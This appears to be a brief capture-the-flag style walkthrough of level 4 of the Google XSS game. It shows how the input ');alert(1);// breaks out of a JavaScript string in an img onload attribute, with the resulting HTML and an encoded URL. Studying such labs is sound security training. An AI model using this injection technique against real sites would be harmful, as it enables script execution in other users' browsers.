  This line is key:
  
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />


Let’s assume {{ timer }} is replaced with user input.

So, if you input 5, it becomes:

<img src="/static/loading.gif" onload="startTimer('5');" />

✅ That’s valid JavaScript.


But what if you input something that breaks out of the string?

🔥 The XSS Attack Idea

Let’s say we pass this:

');alert(1);//
(inside create timer form)

It becomes:

<img src="/static/loading.gif" onload="startTimer('');alert(1);//');" />
or
<img onload="startTimer('&#x27;);alert(1);//');">

url becomes
https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert(1)%3B%2F%2F
or
https://xss-game.appspot.com/level4/frame?timer=');alert(1);//



🎯 JavaScript gets broken into:

startTimer('');

alert(1);

//'); (commented out to avoid syntax error)

